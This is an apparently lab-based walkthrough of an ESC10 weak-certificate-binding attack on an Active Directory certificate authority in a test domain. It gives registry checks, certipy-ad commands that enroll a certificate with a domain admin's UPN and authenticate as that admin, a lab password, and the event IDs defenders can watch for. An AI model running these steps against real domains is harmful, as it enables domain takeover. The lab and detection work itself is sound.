# WT#058 — ESC10: Weak Certificate Binding

## Metadata
| Field | Value |
|-------|-------|
| **Target VM** | dc01 (192.168.77.10) |
| **Domain** | cadre.local |
| **CA** | cadre-CA |
| **Template** | CADRE-ESC1 (or any) |
| **Starting Credential** | analyst_dfir / An@lyst_DF1R! |
| **Tools Required** | certipy-ad |
| **Certifications** | ADCS |
| **MITRE ATT&CK** | T1649 |
| **Difficulty** | Medium |

## Prerequisites
- CA service running on dc01
- `StrongCertificateBindingEnforcement` = 0 on dc01 (registry)
- `CertificateMappingMethods` = 0x1F on dc01 (registry)
- `analyst_dfir` has Enroll on any template supporting SAN

## Attack Steps

### 1. Verify weak binding registry settings
```powershell
# Check StrongCertificateBindingEnforcement
reg query HKLM\SYSTEM\CurrentControlSet\Services\Kdc /v StrongCertificateBindingEnforcement

# Check CertificateMappingMethods
reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\Schannel /v CertificateMappingMethods
```

### 2. Enroll certificate with DA UPN in SAN
```powershell
certipy-ad req -ca cadre-CA -template CADRE-ESC1 -upn chief_command@cadre.local -u analyst_dfir@cadre.local -p 'An@lyst_DF1R!' -target 192.168.77.10
```

### 3. Authenticate as DA using weak binding
```powershell
certipy-ad auth -pfx chief_command.pfx -dc-ip 192.168.77.10 -domain cadre.local
```

### 4. DCSync
```powershell
certipy-ad auth -pfx chief_command.pfx -dc-ip 192.168.77.10 -domain cadre.local -ldap-shell
```

## Post-Exploitation Chain
ESC10 → Weak certificate binding → DA authentication with UPN mismatch → DCSync (WT#009) → Full domain compromise (cadre.local)

## Telemetry Verification
- **Event 4887**: Certificate enrollment with alternate SAN
- **Event 4768**: Kerberos TGT issued with certificate (note: UPN in cert differs from requesting user)
- **Event 4624**: Logon using certificate without strong binding enforcement
- **Registry**: `StrongCertificateBindingEnforcement=0` and `CertificateMappingMethods=0x1F` on dc01

## Status
CONFIGURED — This ESC is operational as dc01 has weak certificate binding registry settings applied
